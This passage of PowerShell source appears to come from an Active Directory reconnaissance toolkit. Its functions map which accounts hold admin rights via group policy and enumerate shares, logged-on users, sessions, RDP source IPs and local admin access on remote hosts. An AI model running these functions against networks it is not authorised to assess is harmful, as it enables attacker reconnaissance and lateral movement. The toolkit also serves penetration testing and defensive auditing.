                    } | %{$_.dnshostname}
                }
                else{
                    $OUComputers = Get-NetComputer -ADSpath $_.ADSpath
                }
                $out = New-Object psobject
                $out | Add-Member Noteproperty 'Object' $ObjectDistName
                $out | Add-Member Noteproperty 'GPOname' $GPOname
                $out | Add-Member Noteproperty 'GPOguid' $GPOguid
                $out | Add-Member Noteproperty 'ContainerName' $_.distinguishedname
                $out | Add-Member Noteproperty 'Computers' $OUComputers
                $out
            }

            # find any sites that have this GUID applied
            # TODO: fix, this isn't the correct way to query computers from a site...
            # Get-NetSite -GUID $GPOguid -FullData | %{
            #     if($Filters){
            #         # filter for computer name/org unit if a filter is specified
            #         #   TODO: handle other filters?
            #         $SiteComptuers = Get-NetComputer -ADSpath $_.ADSpath -FullData | ? {
            #             $_.adspath -match ($Filters.Value)
            #         } | %{$_.dnshostname}
            #     }
            #     else{
            #         $SiteComptuers = Get-NetComputer -ADSpath $_.ADSpath
            #     }

            #     $SiteComptuers = Get-NetComputer -ADSpath $_.ADSpath
            #     $out = New-Object psobject
            #     $out | Add-Member Noteproperty 'Object' $ObjectDistName
            #     $out | Add-Member Noteproperty 'GPOname' $GPOname
            #     $out | Add-Member Noteproperty 'GPOguid' $GPOguid
            #     $out | Add-Member Noteproperty 'ContainerName' $_.distinguishedname
            #     $out | Add-Member Noteproperty 'Computers' $OUComputers
            #     $out
            # }

            # mark off this GPO GUID so we don't process it again if there are dupes
            $ProcessedGUIDs[$GPOguid] = $True
        }
    }
}


function Find-GPOComputerAdmin {
    <#
        .SYNOPSIS
        Takes a computer (or GPO) object and determines what users/groups have 
        administrative access over it.
        Inverse of Find-GPOLocation.

        .PARAMETER ComputerName
        The computer to determine local administrative access to.

        .PARAMETER OUName
        OU name to determine who has local adminisrtative acess to computers
        within it. 

        .PARAMETER Domain
        Optional domain the computer/OU exists in.

        .PARAMETER DomainController
        Domain controller to reflect queries through.

        .PARAMETER Recurse
        Switch. If a returned member is a group, recurse and get all members.

        .PARAMETER LocalGroup
        The local group to check access against.
        Can be "Administrators" (S-1-5-32-544), "RDP/Remote Desktop Users" (S-1-5-32-555),
        or a custom local SID.
        Defaults to local 'Administrators'.
    #>
    [CmdletBinding()]
    Param (
        [Parameter(Mandatory=$True)]
        [String]
        $ComputerName,

        [String]
        $OUName,

        [String]
        $Domain,

        [String]
        $DomainController,

        [Switch]
        $Recurse,

        [String]
        $LocalGroup = 'Administrators'
    )

    $TargetComputer = Get-NetComputer -HostName $ComputerName -Domain $Domain -DomainController $DomainController -FullData    

    if(!$TargetComputer) {
        Write-Warning "Computer $ComputerName in domain '$Domain' not found!"
        return
    }

    # extract all OUs a computer is a part of
    # $a = "CN=WINDOWS4,OU=blah,OU=TestMachines,DC=dev,DC=testlab,DC=local"
    $DN = $TargetComputer.distinguishedname
    $TargetOUs = $DN.split(",") | % {
        if($_.startswith("OU=")) {
            $DN.substring($DN.indexof($_))
        }
    }

    Write-Verbose "Target OUs: $TargetOUs"

    $TargetOUs | ? {$_} | % {

        $OU = $_

        # for each OU the computer is a part of, get the full OU object
        $GPOgroups = Get-NetOU -Domain $Domain -DomainController $DomainController -ADSpath $_ -FullData | % { 
            # and then get any GPO links
            $_.gplink.split("][") | % {
                if ($_.startswith("LDAP")) {
                    $_.split(";")[0]
                }
            }
        } | % {
            # for each GPO link, get any locally set user/group SIDs
            Get-NetGPOGroup -Domain $Domain -ADSpath $_
        }

        # for each found GPO group, resolve the SIDs of the members
        $GPOgroups | % {
            $GPO = $_
            $GPO.members | % {
                # resolvethis SID to a domain object
                $Object = Get-ADObject -Domain $Domain -DomainController $DomainController $_

                $out = New-Object psobject
                $out | Add-Member Noteproperty 'ComputerName' $TargetComputer.dnshostname
                $out | Add-Member Noteproperty 'OU' $OU
                $out | Add-Member Noteproperty 'GPODisplayName' $GPO.GPODisplayName
                $out | Add-Member Noteproperty 'GPOPath' $GPO.GPOPath
                $out | Add-Member Noteproperty 'ObjectName' $Object.name
                $out | Add-Member Noteproperty 'ObjectDN' $Object.distinguishedname
                $out | Add-Member Noteproperty 'ObjectSID' $_
                $out | Add-Member Noteproperty 'IsGroup' $($Object.samaccounttype -match '268435456')
                $out 

                # if we're recursing and the current result object is a group
                if($Recurse -and $out.isGroup) {

                    Get-NetGroupMember -SID $_ -FullData -Recurse | % {

                        $out = New-Object psobject
                        $out | Add-Member Noteproperty 'Server' $name

                        $MemberDN = $_.distinguishedName
                        # extract the FQDN from the Distinguished Name
                        $MemberDomain = $MemberDN.subString($MemberDN.IndexOf("DC=")) -replace 'DC=','' -replace ',','.'

                        if ($_.samAccountType -ne "805306368"){
                            $MemberIsGroup = $True
                        }
                        else{
                            $MemberIsGroup = $False
                        }

                        if ($_.samAccountName){
                            # forest users have the samAccountName set
                            $MemberName = $_.samAccountName
                        }
                        else {
                            # external trust users have a SID, so convert it
                            try {
                                $MemberName = Convert-SidToName $_.cn
                            }
                            catch {
                                # if there's a problem contacting the domain to resolve the SID
                                $MemberName = $_.cn
                            }
                        }

                        $out = New-Object psobject
                        $out | Add-Member Noteproperty 'ComputerName' $TargetComputer.dnshostname
                        $out | Add-Member Noteproperty 'OU' $OU
                        $out | Add-Member Noteproperty 'GPODisplayName' $GPO.GPODisplayName
                        $out | Add-Member Noteproperty 'GPOPath' $GPO.GPOPath
                        $out | Add-Member Noteproperty 'ObjectName' $MemberName
                        $out | Add-Member Noteproperty 'ObjectDN' $MemberDN
                        $out | Add-Member Noteproperty 'ObjectSID' $_.objectsid
                        $out | Add-Member Noteproperty 'IsGroup' $MemberIsGroup
                        $out 
                    }
                }

            }
        }

    }

}


function Get-DomainPolicy {
    <#
        .SYNOPSIS
        Returns the default domain or DC policy for a given
        domain or domain controller.

        Thanks Sean Metacalf (@pyrotek3) for the idea and guidance.

        .PARAMETER GPOname
        The GPO name to query for, wildcards accepted.   

        .PARAMETER Domain
        The domain to query for default policies.

        .PARAMETER DomainController
        Domain controller to reflect queries through.

        .PARAMETER ResolveSids
        Switch. Resolve Sids from a DC policy to object names.

        .EXAMPLE
        > Get-NetGPO
        Returns the GPOs in the current domain. 
    #>
    [CmdletBinding()]
    Param (
        [string]
        [ValidateSet("Domain","DC")]
        $Source ="Domain",

        [String]
        $Domain,

        [String]
        $DomainController,

        [Switch]
        $ResolveSids
    )

    if($Source -eq "Domain") {
        # query the given domain for the default domain policy object
        $GPO = Get-NetGPO -Domain $Domain -DomainController $DomainController -GPOname "{31B2F340-016D-11D2-945F-00C04FB984F9}"
        
        if($GPO) {
            # grab the GptTmpl.inf file and parse it
            $GptTmplPath = $GPO.gpcfilesyspath + "\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf"

            # parse the GptTmpl.inf
            Get-GptTmpl $GptTmplPath
        }

    }
    elseif($Source -eq "DC") {
        # query the given domain/dc for the default domain controller policy object
        $GPO = Get-NetGPO -Domain $Domain -DomainController $DomainController -GPOname "{6AC1786C-016F-11D2-945F-00C04FB984F9}"

        if($GPO) {
            # grab the GptTmpl.inf file and parse it
            $GptTmplPath = $GPO.gpcfilesyspath + "\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf"

            # parse the GptTmpl.inf
            Get-GptTmpl $GptTmplPath | % {
                if($ResolveSids){
                    # if we're resolving sids in PrivilegeRights to names
                    $out = New-Object psobject
                    $_.psobject.properties | % {
                        if( $_.Name -eq 'PrivilegeRights') {

                            $PrivilegeRights = New-Object psobject
                            $_.Value.psobject.properties | % {

                                $sids = $_.Value | % {
                                    if($_ -isnot [System.Array]) { 
                                        Convert-SidToName $_ 
                                    }
                                    else {
                                        $_ | % { Convert-SidToName $_ }
                                    }
                                }

                                $PrivilegeRights | Add-Member Noteproperty $_.Name $sids
                            }

                            $out | Add-Member Noteproperty 'PrivilegeRights' $PrivilegeRights
                        }
                        else {
                            $out | Add-Member Noteproperty $_.Name $_.Value
                        }
                    }
                    $out
                }
                else { $_ }
            }
        }
    }
}



########################################################
#
# Functions that enumerate a single host, either through
# WinNT, WMI, remote registry, or API calls 
# (with PSReflect).
#
########################################################

function Get-NetLocalGroup {
    <#
        .SYNOPSIS
        Gets a list of all current users in a specified local group,
        or returns the names of all local groups with -ListGroups.

        .PARAMETER HostName
        The hostname or IP to query for local group users.

        .PARAMETER HostList
        List of hostnames/IPs to query for local group users.

        .PARAMETER GroupName
        The local group name to query for users. If not given, it defaults to "Administrators"

        .PARAMETER ListGroups
        Switch. List all the local groups instead of their members.

        .PARAMETER Recurse
        Switch. If the local member member is a domain group, recursively try to resolve its members to get a list of domain users who can access this machine.

        .EXAMPLE
        > Get-NetLocalGroup
        Returns the usernames that of members of localgroup "Administrators" on the local host.

        .EXAMPLE
        > Get-NetLocalGroup -HostName WINDOWSXP
        Returns all the local administrator accounts for WINDOWSXP

        .EXAMPLE
        > Get-NetLocalGroup -HostName WINDOWS7 -Resurse 
        Returns all effective local/domain users/groups that can access WINDOWS7 with
        local administrative privileges.

        .EXAMPLE
        > Get-NetLocalGroup -HostName WINDOWS7 -ListGroups
        Returns all local groups on the WINDOWS7 host.

        .LINK
        http://stackoverflow.com/questions/21288220/get-all-local-members-and-groups-displayed-together
        http://msdn.microsoft.com/en-us/library/aa772211(VS.85).aspx
    #>

    [CmdletBinding()]
    param(
        [Parameter(ValueFromPipeline=$True)]
        [String]
        $HostName = 'localhost',

        [String]
        $HostList,

        [String]
        $GroupName,

        [Switch]
        $ListGroups,

        [Switch]
        $Recurse
    )

    begin {
        if ((-not $ListGroups) -and (-not $GroupName)){
            # resolve the SID for the local admin group - this should usually default to "Administrators"
            $objSID = New-Object System.Security.Principal.SecurityIdentifier('S-1-5-32-544')
            $objgroup = $objSID.Translate( [System.Security.Principal.NTAccount])
            $GroupName = ($objgroup.Value).Split('\')[1]
        }
    }
    process {

        $Servers = @()

        # if we have a host list passed, grab it
        if($HostList){
            if (Test-Path -Path $HostList){
                $Servers = Get-Content -Path $HostList
            }
            else{
                Write-Warning "[!] Input file '$HostList' doesn't exist!"
                $null
            }
        }
        else{
            # otherwise assume a single host name
            $Servers += Get-NameField $HostName
        }

        # query the specified group using the WINNT provider, and
        # extract fields as appropriate from the results
        foreach($Server in $Servers)
        {
            try{
                if($ListGroups){
                    # if we're listing the group names on a remote server
                    $computer = [ADSI]"WinNT://$server,computer"

                    $computer.psbase.children | Where-Object { $_.psbase.schemaClassName -eq 'group' } | ForEach-Object {
                        $out = New-Object psobject
                        $out | Add-Member Noteproperty 'Server' $Server
                        $out | Add-Member Noteproperty 'Group' ($_.name[0])
                        $out | Add-Member Noteproperty 'SID' ((new-object System.Security.Principal.SecurityIdentifier $_.objectsid[0],0).Value)
                        $out | Add-Member Noteproperty 'Description' ($_.Description[0])
                        $out
                    }
                }
                else {
                    # otherwise we're listing the group members
                    
                    $members = @($([ADSI]"WinNT://$server/$groupname").psbase.Invoke('Members'))
                    $members | ForEach-Object {
                        $out = New-Object psobject
                        $out | Add-Member Noteproperty 'Server' $Server

                        $AdsPath = ($_.GetType().InvokeMember('Adspath', 'GetProperty', $null, $_, $null)).Replace('WinNT://', '')

                        # try to translate the NT4 domain to a FQDN if possible
                        $name = Convert-NT4toCanonical $AdsPath
                        if($name) {
                            $fqdn = $name.split("/")[0]
                            $objName = $AdsPath.split("/")[-1]
                            $name = "$fqdn/$objName"
                            $IsDomain = $True
                        }
                        else {
                            $name = $AdsPath
                            $IsDomain = $False
                        }

                        $out | Add-Member Noteproperty 'AccountName' $name

                        # translate the binary sid to a string
                        $out | Add-Member Noteproperty 'SID' ((New-Object System.Security.Principal.SecurityIdentifier($_.GetType().InvokeMember('ObjectSID', 'GetProperty', $null, $_, $null),0)).Value)

                        # if the account is local, check if it's disabled, if it's domain, always print $false
                        # TODO: fix this error?
                        $out | Add-Member Noteproperty 'Disabled' $( if(-not $IsDomain) { try { $_.GetType().InvokeMember('AccountDisabled', 'GetProperty', $null, $_, $null) } catch { 'ERROR' } } else { $False } )

                        # check if the member is a group
                        $IsGroup = ($_.GetType().InvokeMember('Class', 'GetProperty', $Null, $_, $Null) -eq 'group')
                        $out | Add-Member Noteproperty 'IsGroup' $IsGroup
                        $out | Add-Member Noteproperty 'IsDomain' $IsDomain
                        if($IsGroup){
                            $out | Add-Member Noteproperty 'LastLogin' ""
                        }
                        else{
                            try {
                                $out | Add-Member Noteproperty 'LastLogin' ( $_.GetType().InvokeMember('LastLogin', 'GetProperty', $null, $_, $null))
                            }
                            catch {
                                $out | Add-Member Noteproperty 'LastLogin' ""
                            }
                        }
                        $out

                        # if the result is a group domain object and we're recursing,
                        # try to resolve all the group member results
                        if($Recurse -and $IsDomain -and $IsGroup){

                            $FQDN = $name.split("/")[0]
                            $GroupName = $name.split("/")[1].trim()

                            Get-NetGroupMember -GroupName $GroupName -Domain $FQDN -FullData -Recurse | % {

                                $out = New-Object psobject
                                $out | Add-Member Noteproperty 'Server' $name

                                $MemberDN = $_.distinguishedName
                                # extract the FQDN from the Distinguished Name
                                $MemberDomain = $MemberDN.subString($MemberDN.IndexOf("DC=")) -replace 'DC=','' -replace ',','.'

                                if ($_.samAccountType -ne "805306368"){
                                    $MemberIsGroup = $True
                                }
                                else{
                                    $MemberIsGroup = $False
                                }

                                if ($_.samAccountName){
                                    # forest users have the samAccountName set
                                    $MemberName = $_.samAccountName
                                }
                                else {
                                    # external trust users have a SID, so convert it
                                    try {
                                        $MemberName = Convert-SidToName $_.cn
                                    }
                                    catch {
                                        # if there's a problem contacting the domain to resolve the SID
                                        $MemberName = $_.cn
                                    }
                                }

                                $out | Add-Member Noteproperty 'AccountName' "$MemberDomain/$MemberName"
                                $out | Add-Member Noteproperty 'SID' $_.objectsid
                                $out | Add-Member Noteproperty 'Disabled' $False
                                $out | Add-Member Noteproperty 'IsGroup' $MemberIsGroup
                                $out | Add-Member Noteproperty 'IsDomain' $True
                                $out | Add-Member Noteproperty 'LastLogin' ''
                                $out
                            }
                        }
                    }
                }
            }
            catch {
                Write-Warning "[!] Error: $_"
            }
        }
    }
}


function Get-NetShare {
    <#
        .SYNOPSIS
        Gets share information for a specified server.

        .DESCRIPTION
        This function will execute the NetShareEnum Win32API call to query
        a given host for open shares. This is a replacement for
        "net share \\hostname"

        .PARAMETER HostName
        The hostname to query for shares.

        .OUTPUTS
        SHARE_INFO_1 structure. A representation of the SHARE_INFO_1
        result structure which includes the name and note for each share.

        .EXAMPLE
        > Get-NetShare
        Returns active shares on the local host.

        .EXAMPLE
        > Get-NetShare -HostName sqlserver
        Returns active shares on the 'sqlserver' host
    #>

    [CmdletBinding()]
    param(
        [Parameter(ValueFromPipeline=$True)]
        [String]
        $HostName = 'localhost'
    )

    begin {
        If ($PSBoundParameters['Debug']) {
            $DebugPreference = 'Continue'
        }
    }

    process {

        # process multiple object types
        $HostName = Get-NameField $HostName

        # arguments for NetShareEnum
        $QueryLevel = 1
        $ptrInfo = [IntPtr]::Zero
        $EntriesRead = 0
        $TotalRead = 0
        $ResumeHandle = 0

        # get the share information
        $Result = $Netapi32::NetShareEnum($HostName, $QueryLevel,[ref]$ptrInfo,-1,[ref]$EntriesRead,[ref]$TotalRead,[ref]$ResumeHandle)

        # Locate the offset of the initial intPtr
        $offset = $ptrInfo.ToInt64()

        Write-Debug "Get-NetShare result: $Result"

        # 0 = success
        if (($Result -eq 0) -and ($offset -gt 0)) {

            # Work out how mutch to increment the pointer by finding out the size of the structure
            $Increment = $SHARE_INFO_1::GetSize()

            # parse all the result structures
            for ($i = 0; ($i -lt $EntriesRead); $i++){
                # create a new int ptr at the given offset and cast
                # the pointer as our result structure
                $newintptr = New-Object system.Intptr -ArgumentList $offset
                $Info = $newintptr -as $SHARE_INFO_1
                # return all the sections of the structure
                $Info | Select-Object *
                $offset = $newintptr.ToInt64()
                $offset += $increment
            }
            # free up the result buffer
            $Netapi32::NetApiBufferFree($ptrInfo) | Out-Null
        }
        else
        {
            switch ($Result) {
                (5)           {Write-Debug 'The user does not have access to the requested information.'}
                (124)         {Write-Debug 'The value specified for the level parameter is not valid.'}
                (87)          {Write-Debug 'The specified parameter is not valid.'}
                (234)         {Write-Debug 'More entries are available. Specify a large enough buffer to receive all entries.'}
                (8)           {Write-Debug 'Insufficient memory is available.'}
                (2312)        {Write-Debug 'A session does not exist with the computer name.'}
                (2351)        {Write-Debug 'The computer name is not valid.'}
                (2221)        {Write-Debug 'Username not found.'}
                (53)          {Write-Debug 'Hostname could not be found'}
            }
        }
    }
}


function Get-NetLoggedon {
    <#
        .SYNOPSIS
        Gets users actively logged onto a specified server.

        .DESCRIPTION
        This function will execute the NetWkstaUserEnum Win32API call to query
        a given host for actively logged on users.

        .PARAMETER HostName
        The hostname to query for logged on users.

        .OUTPUTS
        WKSTA_USER_INFO_1 structure. A representation of the WKSTA_USER_INFO_1
        result structure which includes the username and domain of logged on users.

        .EXAMPLE
        > Get-NetLoggedon
        Returns users actively logged onto the local host.

        .EXAMPLE
        > Get-NetLoggedon -HostName sqlserver
        Returns users actively logged onto the 'sqlserver' host.

        .LINK
        http://www.powershellmagazine.com/2014/09/25/easily-defining-enums-structs-and-win32-functions-in-memory/
    #>

    [CmdletBinding()]
    param(
        [Parameter(ValueFromPipeline=$True)]
        [String]
        $HostName = 'localhost'
    )

    begin {
        If ($PSBoundParameters['Debug']) {
            $DebugPreference = 'Continue'
        }
    }

    process {

        # process multiple object types
        $HostName = Get-NameField $HostName

        # Declare the reference variables
        $QueryLevel = 1
        $ptrInfo = [IntPtr]::Zero
        $EntriesRead = 0
        $TotalRead = 0
        $ResumeHandle = 0

        # get logged on user information
        $Result = $Netapi32::NetWkstaUserEnum($HostName, $QueryLevel,[ref]$PtrInfo,-1,[ref]$EntriesRead,[ref]$TotalRead,[ref]$ResumeHandle)

        # Locate the offset of the initial intPtr
        $offset = $ptrInfo.ToInt64()

        Write-Debug "Get-NetLoggedon result: $Result"

        # 0 = success
        if (($Result -eq 0) -and ($offset -gt 0)) {

            # Work out how mutch to increment the pointer by finding out the size of the structure
            $Increment = $WKSTA_USER_INFO_1::GetSize()

            # parse all the result structures
            for ($i = 0; ($i -lt $EntriesRead); $i++){
                # create a new int ptr at the given offset and cast
                # the pointer as our result structure
                $newintptr = New-Object system.Intptr -ArgumentList $offset
                $Info = $newintptr -as $WKSTA_USER_INFO_1
                # return all the sections of the structure
                $Info | Select-Object *
                $offset = $newintptr.ToInt64()
                $offset += $increment

            }
            # free up the result buffer
            $Netapi32::NetApiBufferFree($PtrInfo) | Out-Null
        }
        else
        {
            switch ($Result) {
                (5)           {Write-Debug 'The user does not have access to the requested information.'}
                (124)         {Write-Debug 'The value specified for the level parameter is not valid.'}
                (87)          {Write-Debug 'The specified parameter is not valid.'}
                (234)         {Write-Debug 'More entries are available. Specify a large enough buffer to receive all entries.'}
                (8)           {Write-Debug 'Insufficient memory is available.'}
                (2312)        {Write-Debug 'A session does not exist with the computer name.'}
                (2351)        {Write-Debug 'The computer name is not valid.'}
                (2221)        {Write-Debug 'Username not found.'}
                (53)          {Write-Debug 'Hostname could not be found'}
            }
        }
    }
}


function Get-NetSession {
    <#
        .SYNOPSIS
        Gets active sessions for a specified server.
        Heavily adapted from dunedinite's post on stackoverflow (see LINK below)

        .DESCRIPTION
        This function will execute the NetSessionEnum Win32API call to query
        a given host for active sessions on the host.

        .PARAMETER HostName
        The hostname to query for active sessions.

        .PARAMETER UserName
        The user name to filter for active sessions.

        .OUTPUTS
        SESSION_INFO_10 structure. A representation of the SESSION_INFO_10
        result structure which includes the host and username associated
        with active sessions.

        .EXAMPLE
        > Get-NetSession
        Returns active sessions on the local host.

        .EXAMPLE
        > Get-NetSession -HostName sqlserver
        Returns active sessions on the 'sqlserver' host.

        .LINK
        http://www.powershellmagazine.com/2014/09/25/easily-defining-enums-structs-and-win32-functions-in-memory/
    #>

    [CmdletBinding()]
    param(
        [Parameter(ValueFromPipeline=$True)]
        [String]
        $HostName = 'localhost',

        [String]
        $UserName = ''
    )

    begin {
        If ($PSBoundParameters['Debug']) {
            $DebugPreference = 'Continue'
        }
    }

    process {

        # process multiple object types
        $HostName = Get-NameField $HostName

        # arguments for NetSessionEnum
        $QueryLevel = 10
        $ptrInfo = [IntPtr]::Zero
        $EntriesRead = 0
        $TotalRead = 0
        $ResumeHandle = 0

        # get session information
        $Result = $Netapi32::NetSessionEnum($HostName, '', $UserName, $QueryLevel,[ref]$ptrInfo,-1,[ref]$EntriesRead,[ref]$TotalRead,[ref]$ResumeHandle)

        # Locate the offset of the initial intPtr
        $offset = $ptrInfo.ToInt64()

        Write-Debug "Get-NetSession result: $Result"

        # 0 = success
        if (($Result -eq 0) -and ($offset -gt 0)) {

            # Work out how mutch to increment the pointer by finding out the size of the structure
            $Increment = $SESSION_INFO_10::GetSize()

            # parse all the result structures
            for ($i = 0; ($i -lt $EntriesRead); $i++){
                # create a new int ptr at the given offset and cast
                # the pointer as our result structure
                $newintptr = New-Object system.Intptr -ArgumentList $offset
                $Info = $newintptr -as $SESSION_INFO_10
                # return all the sections of the structure
                $Info | Select-Object *
                $offset = $newintptr.ToInt64()
                $offset += $increment

            }
            # free up the result buffer
            $Netapi32::NetApiBufferFree($PtrInfo) | Out-Null
        }
        else
        {
            switch ($Result) {
                (5)           {Write-Debug 'The user does not have access to the requested information.'}
                (124)         {Write-Debug 'The value specified for the level parameter is not valid.'}
                (87)          {Write-Debug 'The specified parameter is not valid.'}
                (234)         {Write-Debug 'More entries are available. Specify a large enough buffer to receive all entries.'}
                (8)           {Write-Debug 'Insufficient memory is available.'}
                (2312)        {Write-Debug 'A session does not exist with the computer name.'}
                (2351)        {Write-Debug 'The computer name is not valid.'}
                (2221)        {Write-Debug 'Username not found.'}
                (53)          {Write-Debug 'Hostname could not be found'}
            }
        }
    }
}


function Get-NetRDPSession {
    <#
        .SYNOPSIS
        Gets active RDP sessions for a specified server.
        This is a replacement for qwinsta.

        .PARAMETER HostName
        The hostname to query for active RDP sessions.

        .DESCRIPTION
        This function will execute the WTSEnumerateSessionsEx and 
        WTSQuerySessionInformation Win32API calls to query a given
        RDP remote service for active sessions and originating IPs.

        Note: only members of the Administrators or Account Operators local group
        can successfully execute this functionality on a remote target.

        .OUTPUTS
        A custom psobject with the HostName, SessionName, UserName, ID, connection state,
        and source IP of the connection.

        .EXAMPLE
        > Get-NetRDPSession
        Returns active RDP/terminal sessions on the local host.

        .EXAMPLE
        > Get-NetRDPSession -HostName "sqlserver"
        Returns active RDP/terminal sessions on the 'sqlserver' host.
    #>
    [CmdletBinding()]
    param(
        [Parameter(ValueFromPipeline=$True)]
        [String]
        $HostName = 'localhost'
    )
    
    begin {
        If ($PSBoundParameters['Debug']) {
            $DebugPreference = 'Continue'
        }
    }

    process {

        # process multiple object types
        $HostName = Get-NameField $HostName

        # open up a handle to the Remote Desktop Session host
        $handle = $Wtsapi32::WTSOpenServerEx($HostName)

        # if we get a non-zero handle back, everything was successful
        if ($handle -ne 0){

            Write-Debug "WTSOpenServerEx handle: $handle"

            # arguments for WTSEnumerateSessionsEx
            $pLevel = 1
            $filter = 0
            $ppSessionInfo = [IntPtr]::Zero
            $pCount = 0
            
            # get information on all current sessions
            $Result = $Wtsapi32::WTSEnumerateSessionsEx($handle, [ref]1, 0, [ref]$ppSessionInfo, [ref]$pCount)

            # Locate the offset of the initial intPtr
            $offset = $ppSessionInfo.ToInt64()

            Write-Debug "WTSEnumerateSessionsEx result: $Result"
            Write-Debug "pCount: $pCount"

            if (($Result -ne 0) -and ($offset -gt 0)) {

                # Work out how mutch to increment the pointer by finding out the size of the structure
                $Increment = $WTS_SESSION_INFO_1::GetSize()

                # parse all the result structures
                for ($i = 0; ($i -lt $pCount); $i++){
     
                    # create a new int ptr at the given offset and cast
                    # the pointer as our result structure
                    $newintptr = New-Object system.Intptr -ArgumentList $offset
                    $Info = $newintptr -as $WTS_SESSION_INFO_1

                    $out = New-Object psobject
                    if (-not $Info.pHostName){
                        # if no hostname returned, use the specified hostname
                        $out | Add-Member Noteproperty 'HostName' $HostName
                    }
                    else{
                        $out | Add-Member Noteproperty 'HostName' $Info.pHostName
                    }
                    $out | Add-Member Noteproperty 'SessionName' $Info.pSessionName
                    if ($(-not $Info.pDomainName) -or ($Info.pDomainName -eq '')){
                        $out | Add-Member Noteproperty 'UserName' "$($Info.pUserName)"
                    }
                    else {
                        $out | Add-Member Noteproperty 'UserName' "$($Info.pDomainName)\$($Info.pUserName)"
                    }
                    $out | Add-Member Noteproperty 'ID' $Info.SessionID
                    $out | Add-Member Noteproperty 'State' $Info.State

                    $ppBuffer = [IntPtr]::Zero
                    $pBytesReturned = 0

                    # query for the source client IP
                    #   https://msdn.microsoft.com/en-us/library/aa383861(v=vs.85).aspx
                    $Result2 = $Wtsapi32::WTSQuerySessionInformation($handle,$Info.SessionID,14,[ref]$ppBuffer,[ref]$pBytesReturned) 
                    $offset2 = $ppBuffer.ToInt64()
                    $newintptr2 = New-Object System.Intptr -ArgumentList $offset2
                    $Info2 = $newintptr2 -as $WTS_CLIENT_ADDRESS
                    $ip = $Info2.Address         
                    if($ip[2] -ne 0){
                        $SourceIP = [String]$ip[2]+"."+[String]$ip[3]+"."+[String]$ip[4]+"."+[String]$ip[5]
                    }

                    $out | Add-Member Noteproperty 'SourceIP' $SourceIP
                    $out

                    # free up the memory buffer
                    $Null = $Wtsapi32::WTSFreeMemory($ppBuffer)

                    $offset += $increment
                }
                # free up the memory result buffer
                $Null = $Wtsapi32::WTSFreeMemoryEx(2, $ppSessionInfo, $pCount)
            }
            # Close off the service handle
            $Null = $Wtsapi32::WTSCloseServer($handle)
        }
        else{
            # otherwise it failed - get the last error
            $err = $Kernel32::GetLastError()
            # error codes - http://msdn.microsoft.com/en-us/library/windows/desktop/ms681382(v=vs.85).aspx
            Write-Verbuse "LastError: $err"
        }
    }
}


function Invoke-CheckLocalAdminAccess {
    <#
        .SYNOPSIS
        Checks if the current user context has local administrator access
        to a specified host or IP.

        Idea stolen from the local_admin_search_enum post module in
        Metasploit written by:
            'Brandon McCann "zeknox" <bmccann[at]accuvant.com>'
            'Thomas McCarthy "smilingraccoon" <smilingraccoon[at]gmail.com>'
            'Royce Davis "r3dy" <rdavis[at]accuvant.com>'

        .DESCRIPTION
        This function will use the OpenSCManagerW Win32API call to to establish
        a handle to the remote host. If this succeeds, the current user context
        has local administrator acess to the target.

        .PARAMETER HostName
        The hostname to query for active sessions.

        .OUTPUTS
        $true if the current user has local admin access to the hostname,
        $false otherwise

        .EXAMPLE
        > Invoke-CheckLocalAdminAccess -HostName sqlserver
        Returns active sessions on the local host.

        .LINK
        https://github.com/rapid7/metasploit-framework/blob/master/modules/post/windows/gather/local_admin_search_enum.rb
        http://www.powershellmagazine.com/2014/09/25/easily-defining-enums-structs-and-win32-functions-in-memory/
    #>

    [CmdletBinding()]
    param(
        [Parameter(ValueFromPipeline=$True)]
        [String]
        $HostName = 'localhost'
    )

    begin {
        If ($PSBoundParameters['Debug']) {
            $DebugPreference = 'Continue'
        }
    }

    process {

        # process multiple object types
        $HostName = Get-NameField $HostName

        # 0xF003F - SC_MANAGER_ALL_ACCESS
        #   http://msdn.microsoft.com/en-us/library/windows/desktop/ms685981(v=vs.85).aspx
        $handle = $Advapi32::OpenSCManagerW("\\$HostName", 'ServicesActive', 0xF003F)

        Write-Debug "Invoke-CheckLocalAdminAccess handle: $handle"

        # if we get a non-zero handle back, everything was successful
        if ($handle -ne 0){
            # Close off the service handle
            $Advapi32::CloseServiceHandle($handle) | Out-Null
            $true
        }
        else{
            # otherwise it failed - get the last error
            $err = $Kernel32::GetLastError()
            # error codes - http://msdn.microsoft.com/en-us/library/windows/desktop/ms681382(v=vs.85).aspx
            Write-Debug "Invoke-CheckLocalAdminAccess LastError: $err"
            $false
        }
    }
}


function Get-LastLoggedOn {
    <#
        .SYNOPSIS
        Gets the last user logged onto a target machine.

        .DESCRIPTION
        This function uses remote registry functionality to return
        the last user logged onto a target machine.

        Note: This function requires administrative rights on the
        machine you're enumerating.

        .PARAMETER HostName
        The hostname to query for open files. Defaults to the
        local host name.

        .OUTPUTS
        The last loggedon user name, or $null if the enumeration fails.

        .EXAMPLE
        > Get-LastLoggedOn
        Returns the last user logged onto the local machine.

        .EXAMPLE
        > Get-LastLoggedOn -HostName WINDOWS1
        Returns the last user logged onto WINDOWS1
    #>

    [CmdletBinding()]
    param(
        [Parameter(ValueFromPipeline=$True)]
        $HostName = "."
    )

    process {

        # process multiple object types
        $HostName = Get-NameField $HostName

        # try to open up the remote registry key to grab the last logged on user
        try{
            $reg = [WMIClass]"\\$HostName\root\default:stdRegProv"
            $hklm = 2147483650
            $key = "SOFTWARE\Microsoft\Windows\CurrentVersion\Authentication\LogonUI"
            $value = "LastLoggedOnUser"
            $reg.GetStringValue($hklm, $key, $value).sValue
        }
        catch{
            Write-Warning "[!] Error opening remote registry on $HostName. Remote registry likely not enabled."
            $null
        }
    }
}


function Get-NetProcess {
    <#
        .SYNOPSIS
        Gets a list of processes/owners on a remote machine.

        .PARAMETER HostName
        The hostname to query for open files. Defaults to the
        local host name.

        .PARAMETER RemoteUserName
        The "domain\username" to use for the WMI call on a remote system.
        If supplied, 'RemotePassword' must be supplied as well.

        .PARAMETER RemotePassword
        The password to use for the WMI call on a remote system.

        .OUTPUTS
        The last loggedon user name, or $null if the enumeration fails.

        .EXAMPLE
        > Get-LastLoggedOn
        Returns the last user logged onto the local machine.

        .EXAMPLE
        > Get-LastLoggedOn -HostName WINDOWS1
        Returns the last user logged onto WINDOWS1
    #>

    [CmdletBinding()]
    param(
        [Parameter(ValueFromPipeline=$True)]
        [String]
        $HostName,

        [String]
        $RemoteUserName,

        [String]
        $RemotePassword
    )

    process {
        # default to the local hostname
        if (-not $HostName){
